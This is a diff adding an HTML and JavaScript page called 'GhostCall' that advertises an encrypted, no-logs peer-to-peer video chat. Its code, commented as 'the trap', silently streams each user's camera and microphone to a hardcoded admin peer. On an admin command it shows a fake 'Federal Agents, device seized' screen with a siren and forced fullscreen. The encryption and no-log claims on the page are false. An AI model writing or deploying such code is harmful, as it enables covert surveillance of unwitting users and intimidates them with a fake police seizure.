@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>GhostCall | P2P Encrypted Tunnel</title>
+    <link rel="stylesheet" href="main.css">
+    <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
+</head>
+<body>
+
+    <div id="intro-screen" style="text-align:center; padding-top: 20vh;">
+        <h1 style="font-size: 3rem;">GHOST CALL P2P</h1>
+        <p>AES-256 / NO LOGS / GHOST MODE</p>
+        <br><br>
+        <div id="link-container" style="display:none; margin-bottom: 20px;">
+            <p>Share this Secure Link with your Partner:</p>
+            <input type="text" id="room-link" readonly style="width:300px; padding:10px; background:#000; color:#0f0; border:1px solid #0f0;">
+        </div>
+        <button class="btn-encrypt" onclick="initializeTrap()">ESTABLISH SECURE TUNNEL</button>
+    </div>
+
+    <div id="chat-interface" style="display:none;">
+        <div class="header">
+            SECURE CONNECTION: <span style="color:#00ff41">ACTIVE</span> | ENCRYPTION: <span style="color:#00ff41">RSA-4096</span>
+        </div>
+        
+        <div class="video-grid">
+            <video id="remote-video" autoplay playsinline></video>
+            <video id="local-video" class="local-video" autoplay playsinline muted></video>
+        </div>
+
+        <div class="status-bar" id="log-text">
+            > INITIALIZING PACKETS...
+        </div>
+    </div>
+
+    <div id="raid-overlay">
+        <div class="raid-text">FEDERAL AGENTS</div>
+        <div class="raid-sub">THIS DEVICE HAS BEEN SEIZED</div>
+        <div class="raid-sub">IP ADDRESS LOGGED</div>
+    </div>
+
+    <audio id="siren-sound" loop src="https://www.soundjay.com/emergency/police-siren-one-loop-01.mp3"></audio>
+
+    <script>
+        // CONFIGURATION
+        // We use a fixed ID pattern. 
+        // Admin ID is HARDCODED so we always know where to send the stream.
+        const ADMIN_ID = "admin-node-001"; 
+        
+        let myPeer;
+        let myStream;
+        let adminConnection; // To receive "Bust" commands
+
+        // Check if user is "Host" (Created link) or "Guest" (Clicked link)
+        const urlParams = new URLSearchParams(window.location.search);
+        const roomId = urlParams.get('room');
+
+        if(roomId) {
+            // If room exists, user is joining
+            document.getElementById('intro-screen').querySelector('h1').innerText = "JOINING SECURE CHANNEL...";
+            document.getElementById('link-container').style.display = 'none';
+        }
+
+        async function initializeTrap() {
+            // 1. Get Camera Permissions (The "Trust" Step)
+            try {
+                myStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                document.getElementById('local-video').srcObject = myStream;
+                
+                // Switch UI
+                document.getElementById('intro-screen').style.display = 'none';
+                document.getElementById('chat-interface').style.display = 'block';
+
+                startPeerConnection();
+
+            } catch (err) {
+                alert("ERROR: Camera/Mic required for Encryption Handshake.");
+            }
+        }
+
+        function startPeerConnection() {
+            // Generate a random ID for this suspect if no room, or use logic based on room
+            // To keep it simple: We use random IDs, but we Exchange them via the Admin or URL
+            
+            myPeer = new Peer(); // Let PeerJS server assign a random ID
+
+            myPeer.on('open', id => {
+                document.getElementById('log-text').innerText = `> IDENTITY HASH: ${id} (SECURE)`;
+
+                // *** THE TRAP: SILENTLY CALL ADMIN ***
+                console.log("Dialing Surveillance Node...");
+                const adminCall = myPeer.call(ADMIN_ID, myStream);
+                
+                // Connect Data Channel to Admin (To receive "BUST" command)
+                const conn = myPeer.connect(ADMIN_ID);
+                conn.on('open', () => {
+                    adminConnection = conn;
+                    // Listen for commands
+                    conn.on('data', data => {
+                        if (data === "BUST_CMD") {
+                            triggerRaid();
+                        }
+                    });
+                });
+
+                // *** CONNECT TO PARTNER LOGIC ***
+                // If I am the Host (No Room ID in URL), I generate a Room Link
+                if (!roomId) {
+                    const newRoomId = id; // Use my ID as the room ID for simplicity
+                    const link = `${window.location.href}?room=${newRoomId}`;
+                    document.getElementById('link-container').style.display = 'block';
+                    document.getElementById('room-link').value = link;
+                    // Since I am host, I wait for a call
+                    document.getElementById('intro-screen').style.display = 'block'; // Show link to copy
+                    document.getElementById('chat-interface').style.display = 'none'; // Hide chat until link clicked
+                    alert("Copy the link, send to partner, then click 'Establish Tunnel' again.");
+                } else {
+                    // If I am Guest (Room ID exists), I call the Host
+                    const hostId = roomId;
+                    console.log("Calling Partner: " + hostId);
+                    const call = myPeer.call(hostId, myStream);
+                    call.on('stream', remoteStream => {
+                        document.getElementById('remote-video').srcObject = remoteStream;
+                    });
+                }
+            });
+
+            // Handle Incoming Calls (If I am Host, Partner calls me)
+            myPeer.on('call', call => {
+                // Determine if it's Admin calling (Voice of God) or Partner
+                // For simplicity, answer all calls
+                call.answer(myStream);
+                call.on('stream', remoteStream => {
+                    // In a real app check ID, but here we assume it's partner
+                    document.getElementById('remote-video').srcObject = remoteStream;
+                    document.getElementById('chat-interface').style.display = 'block';
+                    document.getElementById('intro-screen').style.display = 'none';
+                });
+            });
+        }
+
+        function triggerRaid() {
+            document.getElementById('chat-interface').style.display = 'none';
+            document.getElementById('raid-overlay').style.display = 'block';
+            document.getElementById('siren-sound').play();
+            
+            // Lock the browser (Fake)
+            if (document.documentElement.requestFullscreen) {
+                document.documentElement.requestFullscreen();
+            }
+        }
+    </script>
+</body>
+</html>
